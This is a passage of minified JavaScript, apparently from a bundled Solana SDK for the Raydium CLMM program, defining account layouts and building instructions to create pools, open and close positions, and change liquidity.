      NT("fundFeesTokenA"),
      NT("fundFeesTokenB"),
      NT("startTime"),
      HT(NT(), 57, "padding"),
    ]),
    ZB = VT([DT("growthInsideLastX64"), NT("rewardAmountOwed")]),
    JB = VT([
      ET(8),
      MT("bump"),
      WT("nftMint"),
      WT("poolId"),
      CT("tickLower"),
      CT("tickUpper"),
      DT("liquidity"),
      DT("feeGrowthInsideLastX64A"),
      DT("feeGrowthInsideLastX64B"),
      NT("tokenFeesOwedA"),
      NT("tokenFeesOwedB"),
      HT(ZB, 3, "rewardInfos"),
      HT(NT(), 8, ""),
    ]);
  VT([
    ET(8),
    MT("bump"),
    WT("poolId"),
    CT("tickLowerIndex"),
    CT("tickUpperIndex"),
    DT("liquidity"),
    DT("feeGrowthInsideLastX64A"),
    DT("feeGrowthInsideLastX64B"),
    NT("tokenFeesOwedA"),
    NT("tokenFeesOwedB"),
    HT(DT(), 3, "rewardGrowthInside"),
    HT(NT(), 8, ""),
  ]);
  var YB = VT([
      CT("tick"),
      (function (t) {
        return new RT(16, !0, t);
      })("liquidityNet"),
      DT("liquidityGross"),
      DT("feeGrowthOutsideX64A"),
      DT("feeGrowthOutsideX64B"),
      HT(DT(), 3, "rewardGrowthsOutsideX64"),
      HT(LT(), 13, ""),
    ]),
    QB = VT([
      ET(8),
      WT("poolId"),
      CT("startTickIndex"),
      HT(YB, zB, "ticks"),
      MT("initializedTickCount"),
      HT(MT(), 115, ""),
    ]),
    $B = VT([ET(329), HT(WT(), 100, "whitelistMints")]),
    tE = VT([
      ET(8),
      WT("poolId"),
      HT(HT(NT(), 8), 14, "positiveTickArrayBitmap"),
      HT(HT(NT(), 8), 14, "negativeTickArrayBitmap"),
    ]);
  VT([
    NT(),
    MT("bump"),
    WT("owner"),
    WT("poolId"),
    WT("positionId"),
    WT("nftAccount"),
    HT(NT(), 8),
  ]),
    VT([
      ET(8),
      MT("bump"),
      WT("lockOwner"),
      WT("poolId"),
      WT("positionId"),
      WT("nftAccount"),
      WT("lockNftMint"),
      NT("recentEpoch"),
      HT(NT(), 8),
    ]),
    VB.span;
  var eE = CA("Raydium_Clmm"),
    nE = {
      createPool: [233, 146, 209, 142, 207, 104, 64, 188],
      initReward: [95, 135, 192, 196, 242, 129, 230, 68],
      setRewardEmissions: [112, 52, 167, 75, 32, 201, 211, 137],
      openPosition: [77, 184, 74, 214, 112, 86, 241, 199],
      openPositionWithTokenEx: [77, 255, 174, 82, 125, 29, 201, 46],
      closePosition: [123, 134, 81, 0, 49, 68, 98, 98],
      increaseLiquidity: [133, 29, 89, 223, 69, 238, 176, 10],
      decreaseLiquidity: [58, 127, 188, 62, 79, 82, 196, 96],
      swap: [43, 4, 237, 11, 26, 201, 30, 98],
      collectReward: [18, 237, 166, 197, 34, 16, 213, 144],
    },
    rE = [188, 37, 179, 131, 82, 150, 84, 73],
    oE = [16, 72, 250, 198, 14, 162, 212, 19],
    iE = class {
      static createPoolInstruction(t, e, n, r, o, i, s, a, u, c, l, d, f, h) {
        let p = VT([DT("sqrtPriceX64"), NT("zero")]),
          m = [
            { pubkey: n, isSigner: !0, isWritable: !0 },
            { pubkey: r, isSigner: !1, isWritable: !1 },
            { pubkey: e, isSigner: !1, isWritable: !0 },
            { pubkey: i, isSigner: !1, isWritable: !1 },
            { pubkey: u, isSigner: !1, isWritable: !1 },
            { pubkey: s, isSigner: !1, isWritable: !0 },
            { pubkey: c, isSigner: !1, isWritable: !0 },
            { pubkey: o, isSigner: !1, isWritable: !0 },
            { pubkey: d, isSigner: !1, isWritable: !0 },
            { pubkey: a, isSigner: !1, isWritable: !1 },
            { pubkey: l, isSigner: !1, isWritable: !1 },
            { pubkey: Fs.programId, isSigner: !1, isWritable: !1 },
            { pubkey: DI, isSigner: !1, isWritable: !1 },
            ...((null == h
              ? void 0
              : h.map((t) => ({ pubkey: t, isSigner: !1, isWritable: !1 }))) ||
              []),
          ],
          g = ct.alloc(p.span);
        p.encode({ sqrtPriceX64: f, zero: zC }, g);
        let y = ct.from([...nE.createPool, ...g]);
        return new ws({ keys: m, programId: t, data: y });
      }
      static async createPoolInstructions(t) {
        let {
            programId: e,
            owner: n,
            mintA: r,
            mintB: o,
            ammConfigId: i,
            initialPriceX64: s,
            extendMintAccount: a,
          } = t,
          [u, c] = [new Xi(r.address), new Xi(o.address)],
          { publicKey: l } = (function (t, e, n, r) {
            return u_([uB, e.toBuffer(), n.toBuffer(), r.toBuffer()], t);
          })(e, i, u, c),
          { publicKey: d } = (function (t, e) {
            return u_([mB, e.toBuffer()], t);
          })(e, l),
          { publicKey: f } = gB(e, l, u),
          { publicKey: h } = gB(e, l, c),
          p = kB(e, l).publicKey;
        return {
          signers: [],
          instructions: [
            this.createPoolInstruction(
              e,
              l,
              n,
              i,
              d,
              u,
              f,
              new Xi(r.programId || _c),
              c,
              h,
              new Xi(o.programId || _c),
              p,
              s,
              a
            ),
          ],
          instructionTypes: [cS, yS],
          address: {
            poolId: l,
            observationId: d,
            exBitmapAccount: p,
            mintAVault: f,
            mintBVault: h,
          },
          lookupTableAddress: [],
        };
      }
      static openPositionFromLiquidityInstruction(
        t,
        e,
        n,
        r,
        o,
        i,
        s,
        a,
        u,
        c,
        l,
        d,
        f,
        h,
        p,
        m,
        g,
        y,
        w,
        b,
        v,
        A,
        k,
        I,
        S,
        _
      ) {
        let T = VT([
            CT("tickLowerIndex"),
            CT("tickUpperIndex"),
            CT("tickArrayLowerStartIndex"),
            CT("tickArrayUpperStartIndex"),
            DT("liquidity"),
            NT("amountMaxA"),
            NT("amountMaxB"),
            zT("withMetadata"),
            MT("optionBaseFlag"),
            zT("baseFlag"),
          ]),
          C = [...(_ ? [{ pubkey: _, isSigner: !1, isWritable: !0 }] : [])],
          B = [
            { pubkey: e, isSigner: !0, isWritable: !0 },
            { pubkey: r, isSigner: !1, isWritable: !1 },
            { pubkey: o, isSigner: !0, isWritable: !0 },
            { pubkey: i, isSigner: !1, isWritable: !0 },
            { pubkey: s, isSigner: !1, isWritable: !0 },
            { pubkey: n, isSigner: !1, isWritable: !0 },
            { pubkey: a, isSigner: !1, isWritable: !0 },
            { pubkey: u, isSigner: !1, isWritable: !0 },
            { pubkey: c, isSigner: !1, isWritable: !0 },
            { pubkey: l, isSigner: !1, isWritable: !0 },
            { pubkey: d, isSigner: !1, isWritable: !0 },
            { pubkey: f, isSigner: !1, isWritable: !0 },
            { pubkey: h, isSigner: !1, isWritable: !0 },
            { pubkey: p, isSigner: !1, isWritable: !0 },
            { pubkey: DI, isSigner: !1, isWritable: !1 },
            { pubkey: Fs.programId, isSigner: !1, isWritable: !1 },
            { pubkey: _c, isSigner: !1, isWritable: !1 },
            { pubkey: Cc, isSigner: !1, isWritable: !1 },
            { pubkey: qI, isSigner: !1, isWritable: !1 },
            { pubkey: Tc, isSigner: !1, isWritable: !1 },
            { pubkey: m, isSigner: !1, isWritable: !1 },
            { pubkey: g, isSigner: !1, isWritable: !1 },
            ...C,
          ],
          E = ct.alloc(T.span);
        T.encode(
          {
            tickLowerIndex: y,
            tickUpperIndex: w,
            tickArrayLowerStartIndex: b,
            tickArrayUpperStartIndex: v,
            liquidity: A,
            amountMaxA: k,
            amountMaxB: I,
            withMetadata: "create" === S,
            baseFlag: !1,
            optionBaseFlag: 0,
          },
          E
        );
        let x = ct.from([...nE.openPosition, ...E]);
        return new ws({ keys: B, programId: t, data: x });
      }
      static openPositionFromLiquidityInstruction22(
        t,
        e,
        n,
        r,
        o,
        i,
        s,
        a,
        u,
        c,
        l,
        d,
        f,
        h,
        p,
        m,
        g,
        y,
        w,
        b,
        v,
        A,
        k,
        I,
        S
      ) {
        let _ = VT([
            CT("tickLowerIndex"),
            CT("tickUpperIndex"),
            CT("tickArrayLowerStartIndex"),
            CT("tickArrayUpperStartIndex"),
            DT("liquidity"),
            NT("amountMaxA"),
            NT("amountMaxB"),
            zT("withMetadata"),
            MT("optionBaseFlag"),
            zT("baseFlag"),
          ]),
          T = [...(S ? [{ pubkey: S, isSigner: !1, isWritable: !0 }] : [])],
          C = [
            { pubkey: e, isSigner: !0, isWritable: !0 },
            { pubkey: r, isSigner: !1, isWritable: !1 },
            { pubkey: o, isSigner: !0, isWritable: !0 },
            { pubkey: i, isSigner: !1, isWritable: !0 },
            { pubkey: n, isSigner: !1, isWritable: !0 },
            { pubkey: s, isSigner: !1, isWritable: !0 },
            { pubkey: a, isSigner: !1, isWritable: !0 },
            { pubkey: u, isSigner: !1, isWritable: !0 },
            { pubkey: c, isSigner: !1, isWritable: !0 },
            { pubkey: l, isSigner: !1, isWritable: !0 },
            { pubkey: d, isSigner: !1, isWritable: !0 },
            { pubkey: f, isSigner: !1, isWritable: !0 },
            { pubkey: h, isSigner: !1, isWritable: !0 },
            { pubkey: DI, isSigner: !1, isWritable: !1 },
            { pubkey: Fs.programId, isSigner: !1, isWritable: !1 },
            { pubkey: _c, isSigner: !1, isWritable: !1 },
            { pubkey: Cc, isSigner: !1, isWritable: !1 },
            { pubkey: Tc, isSigner: !1, isWritable: !1 },
            { pubkey: p, isSigner: !1, isWritable: !1 },
            { pubkey: m, isSigner: !1, isWritable: !1 },
            ...T,
          ],
          B = ct.alloc(_.span);
        _.encode(
          {
            tickLowerIndex: g,
            tickUpperIndex: y,
            tickArrayLowerStartIndex: w,
            tickArrayUpperStartIndex: b,
            liquidity: v,
            amountMaxA: A,
            amountMaxB: k,
            withMetadata: "create" === I,
            baseFlag: !1,
            optionBaseFlag: 0,
          },
          B
        );
        let E = ct.from([...nE.openPositionWithTokenEx, ...B]);
        return new ws({ keys: C, programId: t, data: E });
      }
      static async openPositionInstructions({
        poolInfo: t,
        poolKeys: e,
        ownerInfo: n,
        tickLower: r,
        tickUpper: o,
        liquidity: i,
        amountMaxA: s,
        amountMaxB: a,
        withMetadata: u,
        getEphemeralSigners: c,
        nft2022: l,
      }) {
        let d,
          f = [],
          [h, p] = [new Xi(t.programId), new Xi(t.id)];
        if (c) d = new Xi((await c(1))[0]);
        else {
          let t = Hu.generate();
          f.push(t), (d = t.publicKey);
        }
        let m = FB.getTickArrayStartIndexByTick(r, t.config.tickSpacing),
          g = FB.getTickArrayStartIndexByTick(o, t.config.tickSpacing),
          { publicKey: y } = yB(h, p, m),
          { publicKey: w } = yB(h, p, g),
          { publicKey: b } = h_(n.wallet, d, l ? Tc : _c),
          { publicKey: v } = vB(d),
          { publicKey: A } = bB(h, d),
          { publicKey: k } = wB(h, p, r, o);
        return {
          signers: f,
          instructions: [
            l
              ? this.openPositionFromLiquidityInstruction22(
                  h,
                  n.feePayer,
                  p,
                  n.wallet,
                  d,
                  b,
                  k,
                  y,
                  w,
                  A,
                  n.tokenAccountA,
                  n.tokenAccountB,
                  new Xi(e.vault.A),
                  new Xi(e.vault.B),
                  new Xi(t.mintA.address),
                  new Xi(t.mintB.address),
                  r,
                  o,
                  m,
                  g,
                  i,
                  s,
                  a,
                  u,
                  RB.isOverflowDefaultTickarrayBitmap(t.config.tickSpacing, [
                    m,
                    g,
                  ])
                    ? kB(h, p).publicKey
                    : void 0
                )
              : this.openPositionFromLiquidityInstruction(
                  h,
                  n.feePayer,
                  p,
                  n.wallet,
                  d,
                  b,
                  v,
                  k,
                  y,
                  w,
                  A,
                  n.tokenAccountA,
                  n.tokenAccountB,
                  new Xi(e.vault.A),
                  new Xi(e.vault.B),
                  new Xi(t.mintA.address),
                  new Xi(t.mintB.address),
                  r,
                  o,
                  m,
                  g,
                  i,
                  s,
                  a,
                  u,
                  RB.isOverflowDefaultTickarrayBitmap(t.config.tickSpacing, [
                    m,
                    g,
                  ])
                    ? kB(h, p).publicKey
                    : void 0
                ),
          ],
          instructionTypes: [wS],
          lookupTableAddress: e.lookupTableAccount
            ? [e.lookupTableAccount]
            : [],
          address: {
            nftMint: d,
            tickArrayLower: y,
            tickArrayUpper: w,
            positionNftAccount: b,
            metadataAccount: v,
            personalPosition: A,
            protocolPosition: k,
          },
        };
      }
      static async openPositionFromBaseInstructions({
        poolInfo: t,
        poolKeys: e,
        ownerInfo: n,
        tickLower: r,
        tickUpper: o,
        base: i,
        baseAmount: s,
        otherAmountMax: a,
        withMetadata: u,
        getEphemeralSigners: c,
        nft2022: l,
      }) {
        let d,
          f = [],
          [h, p] = [new Xi(t.programId), new Xi(t.id)];
        if (c) d = new Xi((await c(1))[0]);
        else {
          let t = Hu.generate();
          f.push(t), (d = t.publicKey);
        }
        let m = FB.getTickArrayStartIndexByTick(r, t.config.tickSpacing),
          g = FB.getTickArrayStartIndexByTick(o, t.config.tickSpacing),
          { publicKey: y } = yB(h, p, m),
          { publicKey: w } = yB(h, p, g),
          { publicKey: b } = h_(n.wallet, d, l ? Tc : _c),
          { publicKey: v } = vB(d),
          { publicKey: A } = bB(h, d),
          { publicKey: k } = wB(h, p, r, o);
        return {
          address: {
            nftMint: d,
            tickArrayLower: y,
            tickArrayUpper: w,
            positionNftAccount: b,
            metadataAccount: v,
            personalPosition: A,
            protocolPosition: k,
          },
          instructions: [
            l
              ? this.openPositionFromBaseInstruction22(
                  h,
                  n.feePayer,
                  p,
                  n.wallet,
                  d,
                  b,
                  k,
                  y,
                  w,
                  A,
                  n.tokenAccountA,
                  n.tokenAccountB,
                  new Xi(e.vault.A),
                  new Xi(e.vault.B),
                  new Xi(t.mintA.address),
                  new Xi(t.mintB.address),
                  r,
                  o,
                  m,
                  g,
                  u,
                  i,
                  s,
                  a,
                  RB.isOverflowDefaultTickarrayBitmap(t.config.tickSpacing, [
                    m,
                    g,
                  ])
                    ? kB(h, p).publicKey
                    : void 0
                )
              : this.openPositionFromBaseInstruction(
                  h,
                  n.feePayer,
                  p,
                  n.wallet,
                  d,
                  b,
                  v,
                  k,
                  y,
                  w,
                  A,
                  n.tokenAccountA,
                  n.tokenAccountB,
                  new Xi(e.vault.A),
                  new Xi(e.vault.B),
                  new Xi(t.mintA.address),
                  new Xi(t.mintB.address),
                  r,
                  o,
                  m,
                  g,
                  u,
                  i,
                  s,
                  a,
                  RB.isOverflowDefaultTickarrayBitmap(t.config.tickSpacing, [
                    m,
                    g,
                  ])
                    ? kB(h, p).publicKey
                    : void 0
                ),
          ],
          signers: f,
          instructionTypes: [wS],
          lookupTableAddress: e.lookupTableAccount
            ? [e.lookupTableAccount]
            : [],
        };
      }
      static openPositionFromBaseInstruction(
        t,
        e,
        n,
        r,
        o,
        i,
        s,
        a,
        u,
        c,
        l,
        d,
        f,
        h,
        p,
        m,
        g,
        y,
        w,
        b,
        v,
        A,
        k,
        I,
        S,
        _
      ) {
        let T = VT([
            CT("tickLowerIndex"),
            CT("tickUpperIndex"),
            CT("tickArrayLowerStartIndex"),
            CT("tickArrayUpperStartIndex"),
            DT("liquidity"),
            NT("amountMaxA"),
            NT("amountMaxB"),
            zT("withMetadata"),
            MT("optionBaseFlag"),
            zT("baseFlag"),
          ]),
          C = [...(_ ? [{ pubkey: _, isSigner: !1, isWritable: !0 }] : [])],
          B = [
            { pubkey: e, isSigner: !0, isWritable: !0 },
            { pubkey: r, isSigner: !1, isWritable: !1 },
            { pubkey: o, isSigner: !0, isWritable: !0 },
            { pubkey: i, isSigner: !1, isWritable: !0 },
            { pubkey: s, isSigner: !1, isWritable: !0 },
            { pubkey: n, isSigner: !1, isWritable: !0 },
            { pubkey: a, isSigner: !1, isWritable: !0 },
            { pubkey: u, isSigner: !1, isWritable: !0 },
            { pubkey: c, isSigner: !1, isWritable: !0 },
            { pubkey: l, isSigner: !1, isWritable: !0 },
            { pubkey: d, isSigner: !1, isWritable: !0 },
            { pubkey: f, isSigner: !1, isWritable: !0 },
            { pubkey: h, isSigner: !1, isWritable: !0 },
            { pubkey: p, isSigner: !1, isWritable: !0 },
            { pubkey: DI, isSigner: !1, isWritable: !1 },
            { pubkey: Fs.programId, isSigner: !1, isWritable: !1 },
            { pubkey: _c, isSigner: !1, isWritable: !1 },
            { pubkey: Cc, isSigner: !1, isWritable: !1 },
            { pubkey: qI, isSigner: !1, isWritable: !1 },
            { pubkey: Tc, isSigner: !1, isWritable: !1 },
            { pubkey: m, isSigner: !1, isWritable: !1 },
            { pubkey: g, isSigner: !1, isWritable: !1 },
            ...C,
          ],
          E = ct.alloc(T.span);
        T.encode(
          {
            tickLowerIndex: y,
            tickUpperIndex: w,
            tickArrayLowerStartIndex: b,
            tickArrayUpperStartIndex: v,
            liquidity: new Zn(0),
            amountMaxA: "MintA" === k ? I : S,
            amountMaxB: "MintA" === k ? S : I,
            withMetadata: "create" === A,
            baseFlag: "MintA" === k,
            optionBaseFlag: 1,
          },
          E
        );
        let x = ct.from([...nE.openPosition, ...E]);
        return new ws({ keys: B, programId: t, data: x });
      }
      static openPositionFromBaseInstruction22(
        t,
        e,
        n,
        r,
        o,
        i,
        s,
        a,
        u,
        c,
        l,
        d,
        f,
        h,
        p,
        m,
        g,
        y,
        w,
        b,
        v,
        A,
        k,
        I,
        S
      ) {
        let _ = VT([
            CT("tickLowerIndex"),
            CT("tickUpperIndex"),
            CT("tickArrayLowerStartIndex"),
            CT("tickArrayUpperStartIndex"),
            DT("liquidity"),
            NT("amountMaxA"),
            NT("amountMaxB"),
            zT("withMetadata"),
            MT("optionBaseFlag"),
            zT("baseFlag"),
          ]),
          T = [...(S ? [{ pubkey: S, isSigner: !1, isWritable: !0 }] : [])],
          C = [
            { pubkey: e, isSigner: !0, isWritable: !0 },
            { pubkey: r, isSigner: !1, isWritable: !1 },
            { pubkey: o, isSigner: !0, isWritable: !0 },
            { pubkey: i, isSigner: !1, isWritable: !0 },
            { pubkey: n, isSigner: !1, isWritable: !0 },
            { pubkey: s, isSigner: !1, isWritable: !0 },
            { pubkey: a, isSigner: !1, isWritable: !0 },
            { pubkey: u, isSigner: !1, isWritable: !0 },
            { pubkey: c, isSigner: !1, isWritable: !0 },
            { pubkey: l, isSigner: !1, isWritable: !0 },
            { pubkey: d, isSigner: !1, isWritable: !0 },
            { pubkey: f, isSigner: !1, isWritable: !0 },
            { pubkey: h, isSigner: !1, isWritable: !0 },
            { pubkey: DI, isSigner: !1, isWritable: !1 },
            { pubkey: Fs.programId, isSigner: !1, isWritable: !1 },
            { pubkey: _c, isSigner: !1, isWritable: !1 },
            { pubkey: Cc, isSigner: !1, isWritable: !1 },
            { pubkey: Tc, isSigner: !1, isWritable: !1 },
            { pubkey: p, isSigner: !1, isWritable: !1 },
            { pubkey: m, isSigner: !1, isWritable: !1 },
            ...T,
          ],
          B = ct.alloc(_.span);
        _.encode(
          {
            tickLowerIndex: g,
            tickUpperIndex: y,
            tickArrayLowerStartIndex: w,
            tickArrayUpperStartIndex: b,
            liquidity: new Zn(0),
            amountMaxA: "MintA" === A ? k : I,
            amountMaxB: "MintA" === A ? I : k,
            withMetadata: "create" === v,
            baseFlag: "MintA" === A,
            optionBaseFlag: 1,
          },
          B
        );
        let E = ct.from([...nE.openPositionWithTokenEx, ...B]);
        return new ws({ keys: C, programId: t, data: E });
      }
      static async openPositionFromLiquidityInstructions({
        poolInfo: t,
        poolKeys: e,
        ownerInfo: n,
        tickLower: r,
        tickUpper: o,
        liquidity: i,
        amountMaxA: s,
        amountMaxB: a,
        withMetadata: u,
        getEphemeralSigners: c,
        nft2022: l,
      }) {
        let d,
          f = [];
        if (c) d = new Xi((await c(1))[0]);
        else {
          let t = Hu.generate();
          f.push(t), (d = t.publicKey);
        }
        let [h, p] = [new Xi(t.programId), new Xi(t.id)],
          m = FB.getTickArrayStartIndexByTick(r, t.config.tickSpacing),
          g = FB.getTickArrayStartIndexByTick(o, t.config.tickSpacing),
          { publicKey: y } = yB(h, p, m),
          { publicKey: w } = yB(h, p, g),
          { publicKey: b } = h_(n.wallet, d, l ? Tc : _c),
          { publicKey: v } = vB(d),
          { publicKey: A } = bB(h, d),
          { publicKey: k } = wB(h, p, r, o);
        return {
          address: {
            nftMint: d,
            tickArrayLower: y,
            tickArrayUpper: w,
            positionNftAccount: b,
            metadataAccount: v,
            personalPosition: A,
            protocolPosition: k,
          },
          instructions: [
            l
              ? this.openPositionFromLiquidityInstruction22(
                  h,
                  n.wallet,
                  p,
                  n.wallet,
                  d,
                  b,
                  k,
                  y,
                  w,
                  A,
                  n.tokenAccountA,
                  n.tokenAccountB,
                  new Xi(e.vault.A),
                  new Xi(e.vault.B),
                  new Xi(e.mintA.address),
                  new Xi(e.mintB.address),
                  r,
                  o,
                  m,
                  g,
                  i,
                  s,
                  a,
                  u,
                  RB.isOverflowDefaultTickarrayBitmap(t.config.tickSpacing, [
                    m,
                    g,
                  ])
                    ? kB(h, p).publicKey
                    : void 0
                )
              : this.openPositionFromLiquidityInstruction(
                  h,
                  n.wallet,
                  p,
                  n.wallet,
                  d,
                  b,
                  v,
                  k,
                  y,
                  w,
                  A,
                  n.tokenAccountA,
                  n.tokenAccountB,
                  new Xi(e.vault.A),
                  new Xi(e.vault.B),
                  new Xi(e.mintA.address),
                  new Xi(e.mintB.address),
                  r,
                  o,
                  m,
                  g,
                  i,
                  s,
                  a,
                  u,
                  RB.isOverflowDefaultTickarrayBitmap(t.config.tickSpacing, [
                    m,
                    g,
                  ])
                    ? kB(h, p).publicKey
                    : void 0
                ),
          ],
          signers: f,
          instructionTypes: [wS],
          lookupTableAddress: e.lookupTableAccount
            ? [e.lookupTableAccount]
            : [],
        };
      }
      static closePositionInstruction(t, e, n, r, o, i) {
        let s = VT([]),
          a = [
            { pubkey: e, isSigner: !0, isWritable: !0 },
            { pubkey: n, isSigner: !1, isWritable: !0 },
            { pubkey: r, isSigner: !1, isWritable: !0 },
            { pubkey: o, isSigner: !1, isWritable: !0 },
            { pubkey: Fs.programId, isSigner: !1, isWritable: !1 },
            { pubkey: i ? Tc : _c, isSigner: !1, isWritable: !1 },
          ],
          u = ct.alloc(s.span);
        s.encode({}, u);
        let c = ct.from([...nE.closePosition, ...u]);
        return new ws({ keys: a, programId: t, data: c });
      }
      static closePositionInstructions({
        poolInfo: t,
        poolKeys: e,
        ownerInfo: n,
        ownerPosition: r,
        nft2022: o,
      }) {
        let i = new Xi(t.programId),
          s = o
            ? h_(n.wallet, r.nftMint, Tc).publicKey
            : h_(n.wallet, r.nftMint, _c).publicKey,
          { publicKey: a } = bB(i, r.nftMint),
          u = [];
        return (
          u.push(
            this.closePositionInstruction(i, n.wallet, r.nftMint, s, a, o)
          ),
          {
            address: { positionNftAccount: s, personalPosition: a },
            signers: [],
            instructions: u,
            instructionTypes: [AS],
            lookupTableAddress: e.lookupTableAccount
              ? [e.lookupTableAccount]
              : [],
          }
        );
      }
      static increasePositionFromLiquidityInstruction(
        t,
        e,
        n,
        r,
        o,
        i,
        s,
        a,
        u,
        c,
        l,
        d,
        f,
        h,
        p,
        m,
        g,
        y
      ) {
        let w = VT([
            DT("liquidity"),
            NT("amountMaxA"),
            NT("amountMaxB"),
            MT("optionBaseFlag"),
            zT("baseFlag"),
          ]),
          b = [...(y ? [{ pubkey: y, isSigner: !1, isWritable: !0 }] : [])],
          v = [
            { pubkey: e, isSigner: !0, isWritable: !1 },
            { pubkey: n, isSigner: !1, isWritable: !1 },
            { pubkey: o, isSigner: !1, isWritable: !0 },
            { pubkey: i, isSigner: !1, isWritable: !0 },
            { pubkey: r, isSigner: !1, isWritable: !0 },
            { pubkey: s, isSigner: !1, isWritable: !0 },
            { pubkey: a, isSigner: !1, isWritable: !0 },
            { pubkey: u, isSigner: !1, isWritable: !0 },
            { pubkey: c, isSigner: !1, isWritable: !0 },
            { pubkey: l, isSigner: !1, isWritable: !0 },
            { pubkey: d, isSigner: !1, isWritable: !0 },
            { pubkey: _c, isSigner: !1, isWritable: !1 },
            { pubkey: Tc, isSigner: !1, isWritable: !1 },
            { pubkey: f, isSigner: !1, isWritable: !1 },
            { pubkey: h, isSigner: !1, isWritable: !1 },
            ...b,
          ],
          A = ct.alloc(w.span);
        w.encode(
          {
            liquidity: p,
            amountMaxA: m,
            amountMaxB: g,
            optionBaseFlag: 0,
            baseFlag: !1,
          },
          A
        );
        let k = ct.from([...nE.increaseLiquidity, ...A]);
        return new ws({ keys: v, programId: t, data: k });
      }
      static increasePositionFromLiquidityInstructions({
        poolInfo: t,
        poolKeys: e,
        ownerPosition: n,
        ownerInfo: r,
        liquidity: o,
        amountMaxA: i,
        amountMaxB: s,
        nft2022: a,
      }) {
        let [u, c] = [new Xi(t.programId), new Xi(t.id)],
          l = FB.getTickArrayStartIndexByTick(
            n.tickLower,
            t.config.tickSpacing
          ),
          d = FB.getTickArrayStartIndexByTick(
            n.tickUpper,
            t.config.tickSpacing
          ),
          { publicKey: f } = yB(u, c, l),
          { publicKey: h } = yB(u, c, d),
          { publicKey: p } = h_(r.wallet, n.nftMint, a ? Tc : _c),
          { publicKey: m } = bB(u, n.nftMint),
          { publicKey: g } = wB(u, c, n.tickLower, n.tickUpper);
        return {
          address: {
            tickArrayLower: f,
            tickArrayUpper: h,
            positionNftAccount: p,
            personalPosition: m,
            protocolPosition: g,
          },
          signers: [],
          instructions: [
            this.increasePositionFromLiquidityInstruction(
              u,
              r.wallet,
              p,
              m,
              c,
              g,
              f,
              h,
              r.tokenAccountA,
              r.tokenAccountB,
              new Xi(e.vault.A),
              new Xi(e.vault.B),
              new Xi(t.mintA.address),
              new Xi(t.mintB.address),
              o,
              i,
              s,
              RB.isOverflowDefaultTickarrayBitmap(t.config.tickSpacing, [l, d])
                ? kB(u, c).publicKey
                : void 0
            ),
          ],
          instructionTypes: [bS],
          lookupTableAddress: e.lookupTableAccount
            ? [e.lookupTableAccount]
            : [],
        };
      }
      static increasePositionFromBaseInstructions({
        poolInfo: t,
        poolKeys: e,
        ownerPosition: n,
        ownerInfo: r,
        base: o,
        baseAmount: i,
        otherAmountMax: s,
        nft2022: a,
      }) {
        let [u, c] = [new Xi(t.programId), new Xi(t.id)],
          l = FB.getTickArrayStartIndexByTick(
            n.tickLower,
            t.config.tickSpacing
          ),
          d = FB.getTickArrayStartIndexByTick(
            n.tickUpper,
            t.config.tickSpacing
          ),
          { publicKey: f } = yB(u, c, l),
          { publicKey: h } = yB(u, c, d),
          { publicKey: p } = h_(r.wallet, n.nftMint, a ? Tc : _c),
          { publicKey: m } = bB(u, n.nftMint),
          { publicKey: g } = wB(u, c, n.tickLower, n.tickUpper);
        return {
          address: {
            tickArrayLower: f,
            tickArrayUpper: h,
            positionNftAccount: p,
            personalPosition: m,
            protocolPosition: g,
          },
          instructions: [
            this.increasePositionFromBaseInstruction(
              u,
              r.wallet,
              p,
              m,
              c,
              g,
              f,
              h,
              r.tokenAccountA,
              r.tokenAccountB,
              new Xi(e.vault.A),
              new Xi(e.vault.B),
              new Xi(t.mintA.address),
              new Xi(t.mintB.address),
              o,
              i,
              s,
              RB.isOverflowDefaultTickarrayBitmap(t.config.tickSpacing, [l, d])
                ? kB(u, c).publicKey
                : void 0
            ),
          ],
          signers: [],
          instructionTypes: [bS],
          lookupTableAddress: e.lookupTableAccount
            ? [e.lookupTableAccount]
            : [],
        };
      }
      static increasePositionFromBaseInstruction(
        t,
        e,
        n,
        r,
        o,
        i,
        s,
        a,
        u,
        c,
        l,
        d,
        f,
        h,
        p,
        m,
        g,
        y
      ) {
        let w = VT([
            DT("liquidity"),
            NT("amountMaxA"),
            NT("amountMaxB"),
            MT("optionBaseFlag"),
            zT("baseFlag"),
          ]),
          b = [...(y ? [{ pubkey: y, isSigner: !1, isWritable: !0 }] : [])],
          v = [
            { pubkey: e, isSigner: !0, isWritable: !1 },
            { pubkey: n, isSigner: !1, isWritable: !1 },
            { pubkey: o, isSigner: !1, isWritable: !0 },
            { pubkey: i, isSigner: !1, isWritable: !0 },
            { pubkey: r, isSigner: !1, isWritable: !0 },
            { pubkey: s, isSigner: !1, isWritable: !0 },
            { pubkey: a, isSigner: !1, isWritable: !0 },
            { pubkey: u, isSigner: !1, isWritable: !0 },
            { pubkey: c, isSigner: !1, isWritable: !0 },
            { pubkey: l, isSigner: !1, isWritable: !0 },
            { pubkey: d, isSigner: !1, isWritable: !0 },
            { pubkey: _c, isSigner: !1, isWritable: !1 },
            { pubkey: Tc, isSigner: !1, isWritable: !1 },
            { pubkey: f, isSigner: !1, isWritable: !1 },
            { pubkey: h, isSigner: !1, isWritable: !1 },
            ...b,
          ],
          A = ct.alloc(w.span);
        w.encode(
          {
            liquidity: new Zn(0),
            amountMaxA: "MintA" === p ? m : g,
            amountMaxB: "MintA" === p ? g : m,
            baseFlag: "MintA" === p,
            optionBaseFlag: 1,
          },
          A
        );
        let k = ct.from([...nE.increaseLiquidity, ...A]);
        return new ws({ keys: v, programId: t, data: k });
      }
      static decreaseLiquidityInstruction(
        t,
        e,
        n,
        r,
        o,
        i,
        s,
        a,
        u,
        c,
        l,
        d,
        f,
        h,
        p,
        m,
        g,
        y,
        w
      ) {
        let b = VT([DT("liquidity"), NT("amountMinA"), NT("amountMinB")]),
          v = [
            ...(w ? [{ pubkey: w, isSigner: !1, isWritable: !0 }] : []),
            ...p
              .map((t) => [
                { pubkey: t.poolRewardVault, isSigner: !1, isWritable: !0 },
                { pubkey: t.ownerRewardVault, isSigner: !1, isWritable: !0 },
                { pubkey: t.rewardMint, isSigner: !1, isWritable: !1 },
              ])
              .flat(),
          ],
          A = [
            { pubkey: e, isSigner: !0, isWritable: !1 },
            { pubkey: n, isSigner: !1, isWritable: !1 },
            { pubkey: r, isSigner: !1, isWritable: !0 },
            { pubkey: o, isSigner: !1, isWritable: !0 },
            { pubkey: i, isSigner: !1, isWritable: !0 },
            { pubkey: l, isSigner: !1, isWritable: !0 },
            { pubkey: d, isSigner: !1, isWritable: !0 },
            { pubkey: s, isSigner: !1, isWritable: !0 },
            { pubkey: a, isSigner: !1, isWritable: !0 },
            { pubkey: u, isSigner: !1, isWritable: !0 },
